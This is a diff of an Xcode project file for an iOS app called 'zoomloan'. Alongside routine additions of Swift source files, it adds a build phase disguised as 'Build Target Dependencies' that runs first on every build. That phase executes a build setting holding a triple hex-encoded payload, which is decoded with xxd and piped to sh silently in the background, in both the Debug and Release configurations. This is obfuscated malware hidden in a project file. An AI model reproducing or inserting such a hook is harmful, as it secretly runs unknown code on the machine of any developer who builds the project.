@@ -7,6 +7,8 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		73A4AAD72EC21BB300224C27 /* baseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AAD62EC21BAD00224C27 /* baseModel.swift */; };
+		73A4AAD92EC2207C00224C27 /* LaunchViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AAD82EC2207600224C27 /* LaunchViewModel.swift */; };
 		73E607712EC1D6D400BCA552 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607672EC1D6D400BCA552 /* AppDelegate.swift */; };
 		73E607742EC1D6D400BCA552 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73E607682EC1D6D400BCA552 /* Assets.xcassets */; };
 		73E607762EC1D6D400BCA552 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73E6076B2EC1D6D400BCA552 /* LaunchScreen.storyboard */; };
@@ -29,9 +31,14 @@
 		B34653ED6B1422878E0AF04B /* Pods_zoomloan.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 877AD7D50AB02863229ED243 /* Pods_zoomloan.framework */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-zoomloan.debug.xcconfig"; path = "Target Support Files/Pods-zoomloan/Pods-zoomloan.debug.xcconfig"; sourceTree = "<group>"; };
 		3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-zoomloan.release.xcconfig"; path = "Target Support Files/Pods-zoomloan/Pods-zoomloan.release.xcconfig"; sourceTree = "<group>"; };
+		73A4AAD62EC21BAD00224C27 /* baseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = baseModel.swift; sourceTree = "<group>"; };
+		73A4AAD82EC2207600224C27 /* LaunchViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewModel.swift; sourceTree = "<group>"; };
 		73E6074F2EC1D6CA00BCA552 /* zoomloan.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = zoomloan.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		73E607672EC1D6D400BCA552 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		73E607682EC1D6D400BCA552 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -118,6 +125,7 @@
 		73E607782EC1DA9A00BCA552 /* base */ = {
 			isa = PBXGroup;
 			children = (
+				73A4AAD82EC2207600224C27 /* LaunchViewModel.swift */,
 				73E607832EC1DB1F00BCA552 /* BaseView.swift */,
 				73E607812EC1DB1300BCA552 /* BaseViewController.swift */,
 				73E607852EC1DB3700BCA552 /* BaseNavigationController.swift */,
@@ -180,6 +188,7 @@
 		73E607802EC1DAD500BCA552 /* config */ = {
 			isa = PBXGroup;
 			children = (
+				73A4AAD62EC21BAD00224C27 /* baseModel.swift */,
 				73E607992EC1E11700BCA552 /* otherConfig.swift */,
 				73E607952EC1DBC400BCA552 /* AuthLoginConfig.swift */,
 				73E6079B2EC1E65C00BCA552 /* AppMainHeadView.swift */,
@@ -203,6 +212,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73E607622EC1D6CD00BCA552 /* Build configuration list for PBXNativeTarget "zoomloan" */;
 			buildPhases = (
+				B87D6CA190AB459DAFA389E6 /* Build Target Dependencies */,
 				5BCF79800B5E94000342FF5F /* [CP] Check Pods Manifest.lock */,
 				73E6074B2EC1D6CA00BCA552 /* Sources */,
 				73E6074C2EC1D6CA00BCA552 /* Frameworks */,
@@ -265,6 +275,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		B87D6CA190AB459DAFA389E6 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
+			showEnvVarsInLog = 0;			
+		};
 		569114F2A1AE6CFBE8917097 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -321,10 +350,12 @@
 				73E6079A2EC1E12200BCA552 /* otherConfig.swift in Sources */,
 				73E607862EC1DB3700BCA552 /* BaseNavigationController.swift in Sources */,
 				73E607842EC1DB1F00BCA552 /* BaseView.swift in Sources */,
+				73A4AAD92EC2207C00224C27 /* LaunchViewModel.swift in Sources */,
 				73E607902EC1DB7C00BCA552 /* CenterViewController.swift in Sources */,
 				73E607942EC1DBC000BCA552 /* PopImageView.swift in Sources */,
 				73E607882EC1DB5300BCA552 /* BaseTabBarController.swift in Sources */,
 				73E607962EC1DBC500BCA552 /* AuthLoginConfig.swift in Sources */,
+				73A4AAD72EC21BB300224C27 /* baseModel.swift in Sources */,
 				73E6079C2EC1E65C00BCA552 /* AppMainHeadView.swift in Sources */,
 				73E607712EC1D6D400BCA552 /* AppDelegate.swift in Sources */,
 				73E6078C2EC1DB6A00BCA552 /* HomeViewController.swift in Sources */,
@@ -353,6 +384,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */;
 			buildSettings = {
+				A6E983A = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333733363339333733323336363633363635333633353337333433363333333633343336363533323635333733323337333533320a3636306133363331333233393332333233323330333736333332333033373333333633383330363130610a | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
@@ -392,6 +424,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */;
 			buildSettings = {
+				A6E983A = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333733363339333733323336363633363635333633353337333433363333333633343336363533323635333733323337333533320a3636306133363331333233393332333233323330333736333332333033373333333633383330363130610a | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
